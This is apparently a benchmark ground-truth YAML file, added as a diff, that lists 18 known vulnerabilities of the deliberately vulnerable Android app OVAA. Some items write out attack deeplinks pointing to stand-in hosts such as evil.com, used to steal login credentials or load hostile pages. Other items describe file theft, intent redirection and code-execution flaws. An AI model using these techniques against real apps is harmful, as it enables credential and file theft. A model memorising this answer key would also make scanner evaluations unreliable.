@@ -1,0 +1,58 @@
+schema_version: 1
+source: "oversecured/ovaa README \"List of vulnerabilities\" (master, fetched 15 Nov 2026), copied verbatim; titles are the first sentence of each item"
+enrichment_note: null
+items:
+- id: GT-01
+  title: Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`
+  description: Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's user name and password being leaked when they log in.
+- id: GT-02
+  title: "Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions=\"true\"`) via deeplink `oversecured://ovaa/grant_uri_permissions`"
+  description: "Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions=\"true\"`) via deeplink `oversecured://ovaa/grant_uri_permissions`. The attacker's app needs to process `oversecured.ovaa.action.GRANT_PERMISSIONS` and pass intent to `setResult(code, intent)` with flags such as `Intent.FLAG_GRANT_READ_URI_PERMISSION` and the URI of the content provider."
+- id: GT-03
+  title: Vulnerable host validation when processing deeplink `oversecured://ovaa/webview?url=...`
+  description: Vulnerable host validation when processing deeplink `oversecured://ovaa/webview?url=...`.
+- id: GT-04
+  title: Opening arbitrary URLs via deeplink `oversecured://ovaa/webview?url=http://evilexample.com`
+  description: Opening arbitrary URLs via deeplink `oversecured://ovaa/webview?url=http://evilexample.com`. An attacker can use the vulnerable WebView setting `WebSettings.setAllowFileAccessFromFileURLs(true)` in the `WebViewActivity.java` file to steal arbitrary files by sending them XHR requests and obtaining their content.
+- id: GT-05
+  title: Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`
+  description: Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`.
+- id: GT-06
+  title: Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data
+  description: Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data.
+- id: GT-07
+  title: Insecure broadcast to `MainActivity` containing credentials
+  description: Insecure broadcast to `MainActivity` containing credentials. The attacker can register a broadcast receiver with action `oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA` and obtain the user's data.
+- id: GT-08
+  title: "Insecure activity launch in `MainActivity` with action `oversecured.ovaa.action.WEBVIEW`, containing the user's encrypted data in the query parameter `token`"
+  description: "Insecure activity launch in `MainActivity` with action `oversecured.ovaa.action.WEBVIEW`, containing the user's encrypted data in the query parameter `token`."
+- id: GT-09
+  title: Deletion of arbitrary files via the insecure `DeleteFilesSerializable` deserialization object
+  description: Deletion of arbitrary files via the insecure `DeleteFilesSerializable` deserialization object.
+- id: GT-10
+  title: Memory corruption via the `MemoryCorruptionParcelable` object
+  description: Memory corruption via the `MemoryCorruptionParcelable` object.
+- id: GT-11
+  title: Memory corruption via the `MemoryCorruptionSerializable` object
+  description: Memory corruption via the `MemoryCorruptionSerializable` object.
+- id: GT-12
+  title: Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`
+  description: Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`.
+- id: GT-13
+  title: Obtaining access to app logs via `InsecureLoggerService`
+  description: "Obtaining access to app logs via `InsecureLoggerService`. Leak of credentials in `LoginActivity` `Log.d(\"ovaa\", \"Processing \" + loginData)`."
+- id: GT-14
+  title: Use of the hardcoded AES key in `WeakCrypto`
+  description: Use of the hardcoded AES key in `WeakCrypto`.
+- id: GT-15
+  title: Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks
+  description: Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
+- id: GT-16
+  title: Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry
+  description: Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry.
+- id: GT-17
+  title: Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry
+  description: Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry.
+- id: GT-18
+  title: Arbitrary code execution via a DEX library located in a world-readable/writable directory
+  description: Arbitrary code execution via a DEX library located in a world-readable/writable directory.
